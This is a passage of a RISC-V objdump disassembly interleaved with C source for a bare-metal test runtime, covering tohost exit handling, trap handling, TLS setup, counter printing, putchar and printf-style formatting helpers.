    80001a28:	97ba                	add	a5,a5,a4
    80001a2a:	00001717          	auipc	a4,0x1
    80001a2e:	ef670713          	addi	a4,a4,-266 # 80002920 <atol+0x240>
    80001a32:	e398                	sd	a4,0(a5)
    80001a34:	fdc42783          	lw	a5,-36(s0)
    80001a38:	0017871b          	addiw	a4,a5,1
    80001a3c:	fce42e23          	sw	a4,-36(s0)
    80001a40:	0001a717          	auipc	a4,0x1a
    80001a44:	20070713          	addi	a4,a4,512 # 8001bc40 <counters>
    80001a48:	078e                	slli	a5,a5,0x3
    80001a4a:	97ba                	add	a5,a5,a4
    80001a4c:	fe043703          	ld	a4,-32(s0)
    80001a50:	e398                	sd	a4,0(a5)

#undef READ_CTR
}
    80001a52:	0001                	nop
    80001a54:	6426                	ld	s0,72(sp)
    80001a56:	6161                	addi	sp,sp,80
    80001a58:	8082                	ret

0000000080001a5a <tohost_exit>:

void __attribute__((noreturn)) tohost_exit(uintptr_t code)
{
    80001a5a:	1101                	addi	sp,sp,-32
    80001a5c:	ec22                	sd	s0,24(sp)
    80001a5e:	1000                	addi	s0,sp,32
    80001a60:	fea43423          	sd	a0,-24(s0)
  tohost = (code << 1) | 1;
    80001a64:	fe843783          	ld	a5,-24(s0)
    80001a68:	0786                	slli	a5,a5,0x1
    80001a6a:	0017e713          	ori	a4,a5,1
    80001a6e:	fffff797          	auipc	a5,0xfffff
    80001a72:	59278793          	addi	a5,a5,1426 # 80001000 <tohost>
    80001a76:	e398                	sd	a4,0(a5)
  while (1);
    80001a78:	a001                	j	80001a78 <tohost_exit+0x1e>

0000000080001a7a <handle_trap>:
}

uintptr_t __attribute__((weak)) handle_trap(uintptr_t cause, uintptr_t epc, uintptr_t regs[32])
{
    80001a7a:	7179                	addi	sp,sp,-48
    80001a7c:	f406                	sd	ra,40(sp)
    80001a7e:	f022                	sd	s0,32(sp)
    80001a80:	1800                	addi	s0,sp,48
    80001a82:	fea43423          	sd	a0,-24(s0)
    80001a86:	feb43023          	sd	a1,-32(s0)
    80001a8a:	fcc43c23          	sd	a2,-40(s0)
  tohost_exit(1337);
    80001a8e:	53900513          	li	a0,1337
    80001a92:	fc9ff0ef          	jal	ra,80001a5a <tohost_exit>

0000000080001a96 <exit>:
}

void exit(int code)
{
    80001a96:	1101                	addi	sp,sp,-32
    80001a98:	ec06                	sd	ra,24(sp)
    80001a9a:	e822                	sd	s0,16(sp)
    80001a9c:	1000                	addi	s0,sp,32
    80001a9e:	87aa                	mv	a5,a0
    80001aa0:	fef42623          	sw	a5,-20(s0)
  tohost_exit(code);
    80001aa4:	fec42783          	lw	a5,-20(s0)
    80001aa8:	853e                	mv	a0,a5
    80001aaa:	fb1ff0ef          	jal	ra,80001a5a <tohost_exit>

0000000080001aae <abort>:
}

void abort()
{
    80001aae:	1141                	addi	sp,sp,-16
    80001ab0:	e406                	sd	ra,8(sp)
    80001ab2:	e022                	sd	s0,0(sp)
    80001ab4:	0800                	addi	s0,sp,16
  exit(128 + SIGABRT);
    80001ab6:	08600513          	li	a0,134
    80001aba:	fddff0ef          	jal	ra,80001a96 <exit>

0000000080001abe <printstr>:
}

void printstr(const char* s)
{
    80001abe:	7179                	addi	sp,sp,-48
    80001ac0:	f406                	sd	ra,40(sp)
    80001ac2:	f022                	sd	s0,32(sp)
    80001ac4:	ec26                	sd	s1,24(sp)
    80001ac6:	1800                	addi	s0,sp,48
    80001ac8:	fca43c23          	sd	a0,-40(s0)
  syscall(SYS_write, 1, (uintptr_t)s, strlen(s));
    80001acc:	fd843483          	ld	s1,-40(s0)
    80001ad0:	fd843503          	ld	a0,-40(s0)
    80001ad4:	2c9000ef          	jal	ra,8000259c <strlen>
    80001ad8:	87aa                	mv	a5,a0
    80001ada:	86be                	mv	a3,a5
    80001adc:	8626                	mv	a2,s1
    80001ade:	4585                	li	a1,1
    80001ae0:	04000513          	li	a0,64
    80001ae4:	de9ff0ef          	jal	ra,800018cc <syscall>
}
    80001ae8:	0001                	nop
    80001aea:	70a2                	ld	ra,40(sp)
    80001aec:	7402                	ld	s0,32(sp)
    80001aee:	64e2                	ld	s1,24(sp)
    80001af0:	6145                	addi	sp,sp,48
    80001af2:	8082                	ret

0000000080001af4 <thread_entry>:

void __attribute__((weak)) thread_entry(int cid, int nc)
{
    80001af4:	1101                	addi	sp,sp,-32
    80001af6:	ec22                	sd	s0,24(sp)
    80001af8:	1000                	addi	s0,sp,32
    80001afa:	87aa                	mv	a5,a0
    80001afc:	872e                	mv	a4,a1
    80001afe:	fef42623          	sw	a5,-20(s0)
    80001b02:	87ba                	mv	a5,a4
    80001b04:	fef42423          	sw	a5,-24(s0)
  // multi-threaded programs override this function.
  // for the case of single-threaded programs, only let core 0 proceed.
  while (cid != 0);
    80001b08:	fec42783          	lw	a5,-20(s0)
    80001b0c:	2781                	sext.w	a5,a5
    80001b0e:	ffed                	bnez	a5,80001b08 <thread_entry+0x14>
}
    80001b10:	0001                	nop
    80001b12:	0001                	nop
    80001b14:	6462                	ld	s0,24(sp)
    80001b16:	6105                	addi	sp,sp,32
    80001b18:	8082                	ret

int __attribute__((weak)) main(int argc, char** argv)
{
    80001b1a:	1101                	addi	sp,sp,-32
    80001b1c:	ec06                	sd	ra,24(sp)
    80001b1e:	e822                	sd	s0,16(sp)
    80001b20:	1000                	addi	s0,sp,32
    80001b22:	87aa                	mv	a5,a0
    80001b24:	feb43023          	sd	a1,-32(s0)
    80001b28:	fef42623          	sw	a5,-20(s0)
  // single-threaded programs override this function.
  printstr("Implement main(), foo!\n");
    80001b2c:	00001517          	auipc	a0,0x1
    80001b30:	e0450513          	addi	a0,a0,-508 # 80002930 <atol+0x250>
    80001b34:	f8bff0ef          	jal	ra,80001abe <printstr>
  return -1;
    80001b38:	57fd                	li	a5,-1
}
    80001b3a:	853e                	mv	a0,a5
    80001b3c:	60e2                	ld	ra,24(sp)
    80001b3e:	6442                	ld	s0,16(sp)
    80001b40:	6105                	addi	sp,sp,32
    80001b42:	8082                	ret

0000000080001b44 <init_tls>:

static void init_tls()
{
    80001b44:	1101                	addi	sp,sp,-32
    80001b46:	ec06                	sd	ra,24(sp)
    80001b48:	e822                	sd	s0,16(sp)
    80001b4a:	1000                	addi	s0,sp,32
  register void* thread_pointer asm("tp");
  extern char _tls_data;
  extern __thread char _tdata_begin, _tdata_end, _tbss_end;
  size_t tdata_size = &_tdata_end - &_tdata_begin;
    80001b4c:	00020713          	mv	a4,tp
    80001b50:	00020793          	mv	a5,tp
    80001b54:	40f707b3          	sub	a5,a4,a5
    80001b58:	fef43423          	sd	a5,-24(s0)
  memcpy(thread_pointer, &_tls_data, tdata_size);
    80001b5c:	8792                	mv	a5,tp
    80001b5e:	fe843603          	ld	a2,-24(s0)
    80001b62:	0001a597          	auipc	a1,0x1a
    80001b66:	11e58593          	addi	a1,a1,286 # 8001bc80 <_end>
    80001b6a:	853e                	mv	a0,a5
    80001b6c:	0ab000ef          	jal	ra,80002416 <memcpy>
  size_t tbss_size = &_tbss_end - &_tdata_end;
    80001b70:	08420713          	addi	a4,tp,132 # 84 <_tbss_end>
    80001b74:	00020793          	mv	a5,tp
    80001b78:	40f707b3          	sub	a5,a4,a5
    80001b7c:	fef43023          	sd	a5,-32(s0)
  memset(thread_pointer + tdata_size, 0, tbss_size);
    80001b80:	8712                	mv	a4,tp
    80001b82:	fe843783          	ld	a5,-24(s0)
    80001b86:	97ba                	add	a5,a5,a4
    80001b88:	fe043603          	ld	a2,-32(s0)
    80001b8c:	4581                	li	a1,0
    80001b8e:	853e                	mv	a0,a5
    80001b90:	13f000ef          	jal	ra,800024ce <memset>
}
    80001b94:	0001                	nop
    80001b96:	60e2                	ld	ra,24(sp)
    80001b98:	6442                	ld	s0,16(sp)
    80001b9a:	6105                	addi	sp,sp,32
    80001b9c:	8082                	ret

0000000080001b9e <_init>:

void _init(int cid, int nc)
{
    80001b9e:	7171                	addi	sp,sp,-176
    80001ba0:	f506                	sd	ra,168(sp)
    80001ba2:	f122                	sd	s0,160(sp)
    80001ba4:	ed26                	sd	s1,152(sp)
    80001ba6:	1900                	addi	s0,sp,176
    80001ba8:	87aa                	mv	a5,a0
    80001baa:	872e                	mv	a4,a1
    80001bac:	f4f42e23          	sw	a5,-164(s0)
    80001bb0:	87ba                	mv	a5,a4
    80001bb2:	f4f42c23          	sw	a5,-168(s0)
    80001bb6:	fe040793          	addi	a5,s0,-32
    80001bba:	f4f43823          	sd	a5,-176(s0)
    80001bbe:	f5043783          	ld	a5,-176(s0)
    80001bc2:	f8078793          	addi	a5,a5,-128
    80001bc6:	03f78793          	addi	a5,a5,63
    80001bca:	8399                	srli	a5,a5,0x6
    80001bcc:	00679493          	slli	s1,a5,0x6
  init_tls();
    80001bd0:	f75ff0ef          	jal	ra,80001b44 <init_tls>
  thread_entry(cid, nc);
    80001bd4:	f5842703          	lw	a4,-168(s0)
    80001bd8:	f5c42783          	lw	a5,-164(s0)
    80001bdc:	85ba                	mv	a1,a4
    80001bde:	853e                	mv	a0,a5
    80001be0:	f15ff0ef          	jal	ra,80001af4 <thread_entry>

  // only single-threaded programs should ever get here.
  int ret = main(0, 0);
    80001be4:	4581                	li	a1,0
    80001be6:	4501                	li	a0,0
    80001be8:	efcff0ef          	jal	ra,800012e4 <main>
    80001bec:	87aa                	mv	a5,a0
    80001bee:	fcf42823          	sw	a5,-48(s0)

  char buf[NUM_COUNTERS * 32] __attribute__((aligned(64)));
  char* pbuf = buf;
    80001bf2:	fc943c23          	sd	s1,-40(s0)
  for (int i = 0; i < NUM_COUNTERS; i++)
    80001bf6:	fc042a23          	sw	zero,-44(s0)
    80001bfa:	a095                	j	80001c5e <_init+0xc0>
    if (counters[i])
    80001bfc:	0001a717          	auipc	a4,0x1a
    80001c00:	04470713          	addi	a4,a4,68 # 8001bc40 <counters>
    80001c04:	fd442783          	lw	a5,-44(s0)
    80001c08:	078e                	slli	a5,a5,0x3
    80001c0a:	97ba                	add	a5,a5,a4
    80001c0c:	639c                	ld	a5,0(a5)
    80001c0e:	c3b9                	beqz	a5,80001c54 <_init+0xb6>
      pbuf += sprintf(pbuf, "%s = %ld\n", counter_names[i], counters[i]);
    80001c10:	0001a717          	auipc	a4,0x1a
    80001c14:	04070713          	addi	a4,a4,64 # 8001bc50 <counter_names>
    80001c18:	fd442783          	lw	a5,-44(s0)
    80001c1c:	078e                	slli	a5,a5,0x3
    80001c1e:	97ba                	add	a5,a5,a4
    80001c20:	6390                	ld	a2,0(a5)
    80001c22:	0001a717          	auipc	a4,0x1a
    80001c26:	01e70713          	addi	a4,a4,30 # 8001bc40 <counters>
    80001c2a:	fd442783          	lw	a5,-44(s0)
    80001c2e:	078e                	slli	a5,a5,0x3
    80001c30:	97ba                	add	a5,a5,a4
    80001c32:	639c                	ld	a5,0(a5)
    80001c34:	86be                	mv	a3,a5
    80001c36:	00001597          	auipc	a1,0x1
    80001c3a:	d1258593          	addi	a1,a1,-750 # 80002948 <atol+0x268>
    80001c3e:	fd843503          	ld	a0,-40(s0)
    80001c42:	712000ef          	jal	ra,80002354 <sprintf>
    80001c46:	87aa                	mv	a5,a0
    80001c48:	873e                	mv	a4,a5
    80001c4a:	fd843783          	ld	a5,-40(s0)
    80001c4e:	97ba                	add	a5,a5,a4
    80001c50:	fcf43c23          	sd	a5,-40(s0)
  for (int i = 0; i < NUM_COUNTERS; i++)
    80001c54:	fd442783          	lw	a5,-44(s0)
    80001c58:	2785                	addiw	a5,a5,1
    80001c5a:	fcf42a23          	sw	a5,-44(s0)
    80001c5e:	fd442783          	lw	a5,-44(s0)
    80001c62:	0007871b          	sext.w	a4,a5
    80001c66:	4785                	li	a5,1
    80001c68:	f8e7dae3          	ble	a4,a5,80001bfc <_init+0x5e>
  if (pbuf != buf)
    80001c6c:	fd843783          	ld	a5,-40(s0)
    80001c70:	00f48563          	beq	s1,a5,80001c7a <_init+0xdc>
    printstr(buf);
    80001c74:	8526                	mv	a0,s1
    80001c76:	e49ff0ef          	jal	ra,80001abe <printstr>

  exit(ret);
    80001c7a:	fd042783          	lw	a5,-48(s0)
    80001c7e:	853e                	mv	a0,a5
    80001c80:	e17ff0ef          	jal	ra,80001a96 <exit>

0000000080001c84 <putchar>:
}

#undef putchar
int putchar(int ch)
{
    80001c84:	1101                	addi	sp,sp,-32
    80001c86:	ec06                	sd	ra,24(sp)
    80001c88:	e822                	sd	s0,16(sp)
    80001c8a:	1000                	addi	s0,sp,32
    80001c8c:	87aa                	mv	a5,a0
    80001c8e:	fef42623          	sw	a5,-20(s0)
  static __thread char buf[64] __attribute__((aligned(64)));
  static __thread int buflen = 0;

  buf[buflen++] = ch;
    80001c92:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001c96:	0017871b          	addiw	a4,a5,1
    80001c9a:	0007069b          	sext.w	a3,a4
    80001c9e:	08d22023          	sw	a3,128(tp) # 80 <buflen.2991>
    80001ca2:	fec42703          	lw	a4,-20(s0)
    80001ca6:	0ff77713          	andi	a4,a4,255
    80001caa:	04020693          	addi	a3,tp,64 # 40 <buf.2990>
    80001cae:	97b6                	add	a5,a5,a3
    80001cb0:	00e78023          	sb	a4,0(a5)

  if (ch == '\n' || buflen == sizeof(buf))
    80001cb4:	fec42783          	lw	a5,-20(s0)
    80001cb8:	0007871b          	sext.w	a4,a5
    80001cbc:	47a9                	li	a5,10
    80001cbe:	00f70963          	beq	a4,a5,80001cd0 <putchar+0x4c>
    80001cc2:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001cc6:	873e                	mv	a4,a5
    80001cc8:	04000793          	li	a5,64
    80001ccc:	00f71f63          	bne	a4,a5,80001cea <putchar+0x66>
  {
    syscall(SYS_write, 1, (uintptr_t)buf, buflen);
    80001cd0:	04020713          	addi	a4,tp,64 # 40 <buf.2990>
    80001cd4:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001cd8:	86be                	mv	a3,a5
    80001cda:	863a                	mv	a2,a4
    80001cdc:	4585                	li	a1,1
    80001cde:	04000513          	li	a0,64
    80001ce2:	bebff0ef          	jal	ra,800018cc <syscall>
    buflen = 0;
    80001ce6:	08022023          	sw	zero,128(tp) # 80 <buflen.2991>
  }

  return 0;
    80001cea:	4781                	li	a5,0
}
    80001cec:	853e                	mv	a0,a5
    80001cee:	60e2                	ld	ra,24(sp)
    80001cf0:	6442                	ld	s0,16(sp)
    80001cf2:	6105                	addi	sp,sp,32
    80001cf4:	8082                	ret

0000000080001cf6 <printhex>:

void printhex(uint64_t x)
{
    80001cf6:	7139                	addi	sp,sp,-64
    80001cf8:	fc06                	sd	ra,56(sp)
    80001cfa:	f822                	sd	s0,48(sp)
    80001cfc:	0080                	addi	s0,sp,64
    80001cfe:	fca43423          	sd	a0,-56(s0)
  char str[17];
  int i;
  for (i = 0; i < 16; i++)
    80001d02:	fe042623          	sw	zero,-20(s0)
    80001d06:	a8a1                	j	80001d5e <printhex+0x68>
  {
    str[15-i] = (x & 0xF) + ((x & 0xF) < 10 ? '0' : 'a'-10);
    80001d08:	fc843783          	ld	a5,-56(s0)
    80001d0c:	0ff7f793          	andi	a5,a5,255
    80001d10:	8bbd                	andi	a5,a5,15
    80001d12:	0ff7f713          	andi	a4,a5,255
    80001d16:	fc843783          	ld	a5,-56(s0)
    80001d1a:	00f7f693          	andi	a3,a5,15
    80001d1e:	47a5                	li	a5,9
    80001d20:	00d7e563          	bltu	a5,a3,80001d2a <printhex+0x34>
    80001d24:	03000793          	li	a5,48
    80001d28:	a019                	j	80001d2e <printhex+0x38>
    80001d2a:	05700793          	li	a5,87
    80001d2e:	463d                	li	a2,15
    80001d30:	fec42683          	lw	a3,-20(s0)
    80001d34:	40d606bb          	subw	a3,a2,a3
    80001d38:	2681                	sext.w	a3,a3
    80001d3a:	9fb9                	addw	a5,a5,a4
    80001d3c:	0ff7f713          	andi	a4,a5,255
    80001d40:	ff040793          	addi	a5,s0,-16
    80001d44:	97b6                	add	a5,a5,a3
    80001d46:	fee78423          	sb	a4,-24(a5)
    x >>= 4;
    80001d4a:	fc843783          	ld	a5,-56(s0)
    80001d4e:	8391                	srli	a5,a5,0x4
    80001d50:	fcf43423          	sd	a5,-56(s0)
  for (i = 0; i < 16; i++)
    80001d54:	fec42783          	lw	a5,-20(s0)
    80001d58:	2785                	addiw	a5,a5,1
    80001d5a:	fef42623          	sw	a5,-20(s0)
    80001d5e:	fec42783          	lw	a5,-20(s0)
    80001d62:	0007871b          	sext.w	a4,a5
    80001d66:	47bd                	li	a5,15
    80001d68:	fae7d0e3          	ble	a4,a5,80001d08 <printhex+0x12>
  }
  str[16] = 0;
    80001d6c:	fe040423          	sb	zero,-24(s0)

  printstr(str);
    80001d70:	fd840793          	addi	a5,s0,-40
    80001d74:	853e                	mv	a0,a5
    80001d76:	d49ff0ef          	jal	ra,80001abe <printstr>
}
    80001d7a:	0001                	nop
    80001d7c:	70e2                	ld	ra,56(sp)
    80001d7e:	7442                	ld	s0,48(sp)
    80001d80:	6121                	addi	sp,sp,64
    80001d82:	8082                	ret

0000000080001d84 <printnum>:

static inline void printnum(void (*putch)(int, void**), void **putdat,
                    unsigned long long num, unsigned base, int width, int padc)
{
    80001d84:	714d                	addi	sp,sp,-336
    80001d86:	e686                	sd	ra,328(sp)
    80001d88:	e2a2                	sd	s0,320(sp)
    80001d8a:	0a80                	addi	s0,sp,336
    80001d8c:	eca43c23          	sd	a0,-296(s0)
    80001d90:	ecb43823          	sd	a1,-304(s0)
    80001d94:	ecc43423          	sd	a2,-312(s0)
    80001d98:	8636                	mv	a2,a3
    80001d9a:	86ba                	mv	a3,a4
    80001d9c:	873e                	mv	a4,a5
    80001d9e:	87b2                	mv	a5,a2
    80001da0:	ecf42223          	sw	a5,-316(s0)
    80001da4:	87b6                	mv	a5,a3
    80001da6:	ecf42023          	sw	a5,-320(s0)
    80001daa:	87ba                	mv	a5,a4
    80001dac:	eaf42e23          	sw	a5,-324(s0)
  unsigned digs[sizeof(num)*CHAR_BIT];
  int pos = 0;
    80001db0:	fe042623          	sw	zero,-20(s0)

  while (1)
  {
    digs[pos++] = num % base;
    80001db4:	ec446783          	lwu	a5,-316(s0)
    80001db8:	ec843703          	ld	a4,-312(s0)
    80001dbc:	02f776b3          	remu	a3,a4,a5
    80001dc0:	fec42783          	lw	a5,-20(s0)
    80001dc4:	0017871b          	addiw	a4,a5,1
    80001dc8:	fee42623          	sw	a4,-20(s0)
    80001dcc:	0006871b          	sext.w	a4,a3
    80001dd0:	078a                	slli	a5,a5,0x2
    80001dd2:	ff040693          	addi	a3,s0,-16
    80001dd6:	97b6                	add	a5,a5,a3
    80001dd8:	eee7ac23          	sw	a4,-264(a5)
    if (num < base)
    80001ddc:	ec446783          	lwu	a5,-316(s0)
    80001de0:	ec843703          	ld	a4,-312(s0)
    80001de4:	00f76b63          	bltu	a4,a5,80001dfa <printnum+0x76>
      break;
    num /= base;
    80001de8:	ec446783          	lwu	a5,-316(s0)
    80001dec:	ec843703          	ld	a4,-312(s0)
    80001df0:	02f757b3          	divu	a5,a4,a5
    80001df4:	ecf43423          	sd	a5,-312(s0)
    digs[pos++] = num % base;
    80001df8:	bf75                	j	80001db4 <printnum+0x30>
      break;
    80001dfa:	0001                	nop
  }

  while (width-- > pos)
    80001dfc:	a809                	j	80001e0e <printnum+0x8a>
    putch(padc, putdat);
    80001dfe:	ebc42783          	lw	a5,-324(s0)
    80001e02:	ed843703          	ld	a4,-296(s0)
    80001e06:	ed043583          	ld	a1,-304(s0)
    80001e0a:	853e                	mv	a0,a5
    80001e0c:	9702                	jalr	a4
  while (width-- > pos)
    80001e0e:	ec042783          	lw	a5,-320(s0)
    80001e12:	fff7871b          	addiw	a4,a5,-1
    80001e16:	ece42023          	sw	a4,-320(s0)
    80001e1a:	fec42703          	lw	a4,-20(s0)
    80001e1e:	2701                	sext.w	a4,a4
    80001e20:	fcf74fe3          	blt	a4,a5,80001dfe <printnum+0x7a>

  while (pos-- > 0)
    80001e24:	a099                	j	80001e6a <printnum+0xe6>
    putch(digs[pos] + (digs[pos] >= 10 ? 'a' - 10 : '0'), putdat);
    80001e26:	fec42783          	lw	a5,-20(s0)
    80001e2a:	078a                	slli	a5,a5,0x2
    80001e2c:	ff040713          	addi	a4,s0,-16
    80001e30:	97ba                	add	a5,a5,a4
    80001e32:	ef87a703          	lw	a4,-264(a5)
    80001e36:	fec42783          	lw	a5,-20(s0)
    80001e3a:	078a                	slli	a5,a5,0x2
    80001e3c:	ff040693          	addi	a3,s0,-16
    80001e40:	97b6                	add	a5,a5,a3
    80001e42:	ef87a783          	lw	a5,-264(a5)
    80001e46:	86be                	mv	a3,a5
    80001e48:	47a5                	li	a5,9
    80001e4a:	00d7f563          	bleu	a3,a5,80001e54 <printnum+0xd0>
    80001e4e:	05700793          	li	a5,87
    80001e52:	a019                	j	80001e58 <printnum+0xd4>
    80001e54:	03000793          	li	a5,48
    80001e58:	9fb9                	addw	a5,a5,a4
    80001e5a:	2781                	sext.w	a5,a5
    80001e5c:	2781                	sext.w	a5,a5
    80001e5e:	ed843703          	ld	a4,-296(s0)
    80001e62:	ed043583          	ld	a1,-304(s0)
    80001e66:	853e                	mv	a0,a5
    80001e68:	9702                	jalr	a4
  while (pos-- > 0)
    80001e6a:	fec42783          	lw	a5,-20(s0)
    80001e6e:	fff7871b          	addiw	a4,a5,-1
    80001e72:	fee42623          	sw	a4,-20(s0)
    80001e76:	faf048e3          	bgtz	a5,80001e26 <printnum+0xa2>
}
    80001e7a:	0001                	nop
    80001e7c:	0001                	nop
    80001e7e:	60b6                	ld	ra,328(sp)
    80001e80:	6416                	ld	s0,320(sp)
    80001e82:	6171                	addi	sp,sp,336
    80001e84:	8082                	ret

0000000080001e86 <getuint>:

static unsigned long long getuint(va_list *ap, int lflag)
{
    80001e86:	1101                	addi	sp,sp,-32
    80001e88:	ec22                	sd	s0,24(sp)
    80001e8a:	1000                	addi	s0,sp,32
    80001e8c:	fea43423          	sd	a0,-24(s0)
    80001e90:	87ae                	mv	a5,a1
    80001e92:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001e96:	fe442783          	lw	a5,-28(s0)
    80001e9a:	0007871b          	sext.w	a4,a5
    80001e9e:	4785                	li	a5,1
    80001ea0:	00e7dc63          	ble	a4,a5,80001eb8 <getuint+0x32>
    return va_arg(*ap, unsigned long long);
    80001ea4:	fe843783          	ld	a5,-24(s0)
    80001ea8:	639c                	ld	a5,0(a5)
    80001eaa:	00878693          	addi	a3,a5,8
    80001eae:	fe843703          	ld	a4,-24(s0)
    80001eb2:	e314                	sd	a3,0(a4)
    80001eb4:	639c                	ld	a5,0(a5)
    80001eb6:	a815                	j	80001eea <getuint+0x64>
  else if (lflag)
    80001eb8:	fe442783          	lw	a5,-28(s0)
    80001ebc:	2781                	sext.w	a5,a5
    80001ebe:	cb99                	beqz	a5,80001ed4 <getuint+0x4e>
    return va_arg(*ap, unsigned long);
    80001ec0:	fe843783          	ld	a5,-24(s0)
    80001ec4:	639c                	ld	a5,0(a5)
    80001ec6:	00878693          	addi	a3,a5,8
    80001eca:	fe843703          	ld	a4,-24(s0)
    80001ece:	e314                	sd	a3,0(a4)
    80001ed0:	639c                	ld	a5,0(a5)
    80001ed2:	a821                	j	80001eea <getuint+0x64>
  else
    return va_arg(*ap, unsigned int);
    80001ed4:	fe843783          	ld	a5,-24(s0)
    80001ed8:	639c                	ld	a5,0(a5)
    80001eda:	00878693          	addi	a3,a5,8
    80001ede:	fe843703          	ld	a4,-24(s0)
    80001ee2:	e314                	sd	a3,0(a4)
    80001ee4:	439c                	lw	a5,0(a5)
    80001ee6:	1782                	slli	a5,a5,0x20
    80001ee8:	9381                	srli	a5,a5,0x20
}
    80001eea:	853e                	mv	a0,a5
    80001eec:	6462                	ld	s0,24(sp)
    80001eee:	6105                	addi	sp,sp,32
    80001ef0:	8082                	ret

0000000080001ef2 <getint>:

static long long getint(va_list *ap, int lflag)
{
    80001ef2:	1101                	addi	sp,sp,-32
    80001ef4:	ec22                	sd	s0,24(sp)
    80001ef6:	1000                	addi	s0,sp,32
    80001ef8:	fea43423          	sd	a0,-24(s0)
    80001efc:	87ae                	mv	a5,a1
    80001efe:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001f02:	fe442783          	lw	a5,-28(s0)
    80001f06:	0007871b          	sext.w	a4,a5
    80001f0a:	4785                	li	a5,1
    80001f0c:	00e7dc63          	ble	a4,a5,80001f24 <getint+0x32>
    return va_arg(*ap, long long);
    80001f10:	fe843783          	ld	a5,-24(s0)
    80001f14:	639c                	ld	a5,0(a5)
    80001f16:	00878693          	addi	a3,a5,8
    80001f1a:	fe843703          	ld	a4,-24(s0)
    80001f1e:	e314                	sd	a3,0(a4)
    80001f20:	639c                	ld	a5,0(a5)
    80001f22:	a805                	j	80001f52 <getint+0x60>
  else if (lflag)
    80001f24:	fe442783          	lw	a5,-28(s0)
    80001f28:	2781                	sext.w	a5,a5
    80001f2a:	cb99                	beqz	a5,80001f40 <getint+0x4e>
    return va_arg(*ap, long);
    80001f2c:	fe843783          	ld	a5,-24(s0)
    80001f30:	639c                	ld	a5,0(a5)
    80001f32:	00878693          	addi	a3,a5,8
    80001f36:	fe843703          	ld	a4,-24(s0)
    80001f3a:	e314                	sd	a3,0(a4)
    80001f3c:	639c                	ld	a5,0(a5)
    80001f3e:	a811                	j	80001f52 <getint+0x60>
  else
    return va_arg(*ap, int);
    80001f40:	fe843783          	ld	a5,-24(s0)
    80001f44:	639c                	ld	a5,0(a5)
    80001f46:	00878693          	addi	a3,a5,8
    80001f4a:	fe843703          	ld	a4,-24(s0)
    80001f4e:	e314                	sd	a3,0(a4)
    80001f50:	439c                	lw	a5,0(a5)
}
    80001f52:	853e                	mv	a0,a5
    80001f54:	6462                	ld	s0,24(sp)
    80001f56:	6105                	addi	sp,sp,32
    80001f58:	8082                	ret

0000000080001f5a <vprintfmt>:

static void vprintfmt(void (*putch)(int, void**), void **putdat, const char *fmt, va_list ap)
{
    80001f5a:	7159                	addi	sp,sp,-112
    80001f5c:	f486                	sd	ra,104(sp)
    80001f5e:	f0a2                	sd	s0,96(sp)
    80001f60:	eca6                	sd	s1,88(sp)
    80001f62:	e8ca                	sd	s2,80(sp)
    80001f64:	1880                	addi	s0,sp,112
    80001f66:	faa43423          	sd	a0,-88(s0)
    80001f6a:	fab43023          	sd	a1,-96(s0)
    80001f6e:	f8c43c23          	sd	a2,-104(s0)
    80001f72:	f8d43823          	sd	a3,-112(s0)
  unsigned long long num;
  int base, lflag, width, precision, altflag;
  char padc;

  while (1) {
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001f76:	a831                	j	80001f92 <vprintfmt+0x38>
      if (ch == '\0')
    80001f78:	32048963          	beqz	s1,800022aa <vprintfmt+0x350>
        return;
      fmt++;
    80001f7c:	f9843783          	ld	a5,-104(s0)
    80001f80:	0785                	addi	a5,a5,1
    80001f82:	f8f43c23          	sd	a5,-104(s0)
      putch(ch, putdat);
    80001f86:	fa843783          	ld	a5,-88(s0)
    80001f8a:	fa043583          	ld	a1,-96(s0)
    80001f8e:	8526                	mv	a0,s1
    80001f90:	9782                	jalr	a5
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001f92:	f9843783          	ld	a5,-104(s0)
    80001f96:	0007c783          	lbu	a5,0(a5)
    80001f9a:	0007849b          	sext.w	s1,a5
    80001f9e:	8726                	mv	a4,s1
    80001fa0:	02500793          	li	a5,37
    80001fa4:	fcf71ae3          	bne	a4,a5,80001f78 <vprintfmt+0x1e>
    }
    fmt++;
    80001fa8:	f9843783          	ld	a5,-104(s0)
    80001fac:	0785                	addi	a5,a5,1
    80001fae:	f8f43c23          	sd	a5,-104(s0)

    // Process a %-escape sequence
    last_fmt = fmt;
    80001fb2:	f9843783          	ld	a5,-104(s0)
    80001fb6:	faf43c23          	sd	a5,-72(s0)
    padc = ' ';
    80001fba:	02000793          	li	a5,32
    80001fbe:	fcf403a3          	sb	a5,-57(s0)
    width = -1;
    80001fc2:	57fd                	li	a5,-1
    80001fc4:	fcf42623          	sw	a5,-52(s0)
    precision = -1;
    80001fc8:	57fd                	li	a5,-1
    80001fca:	fcf42423          	sw	a5,-56(s0)
    lflag = 0;
    80001fce:	fc042823          	sw	zero,-48(s0)
    altflag = 0;
    80001fd2:	fa042a23          	sw	zero,-76(s0)
  reswitch:
    switch (ch = *(unsigned char *) fmt++) {
    80001fd6:	f9843783          	ld	a5,-104(s0)
    80001fda:	00178713          	addi	a4,a5,1
    80001fde:	f8e43c23          	sd	a4,-104(s0)
    80001fe2:	0007c783          	lbu	a5,0(a5)
    80001fe6:	0007849b          	sext.w	s1,a5
    80001fea:	fdd4869b          	addiw	a3,s1,-35
    80001fee:	0006871b          	sext.w	a4,a3
    80001ff2:	05500793          	li	a5,85
    80001ff6:	28e7ed63          	bltu	a5,a4,80002290 <vprintfmt+0x336>
    80001ffa:	02069793          	slli	a5,a3,0x20
    80001ffe:	9381                	srli	a5,a5,0x20
    80002000:	00279713          	slli	a4,a5,0x2
    80002004:	00001797          	auipc	a5,0x1
    80002008:	95c78793          	addi	a5,a5,-1700 # 80002960 <atol+0x280>
    8000200c:	97ba                	add	a5,a5,a4
    8000200e:	439c                	lw	a5,0(a5)
    80002010:	0007871b          	sext.w	a4,a5
    80002014:	00001797          	auipc	a5,0x1
    80002018:	94c78793          	addi	a5,a5,-1716 # 80002960 <atol+0x280>
    8000201c:	97ba                	add	a5,a5,a4
    8000201e:	8782                	jr	a5

    // flag to pad on the right
    case '-':
      padc = '-';
    80002020:	02d00793          	li	a5,45
    80002024:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
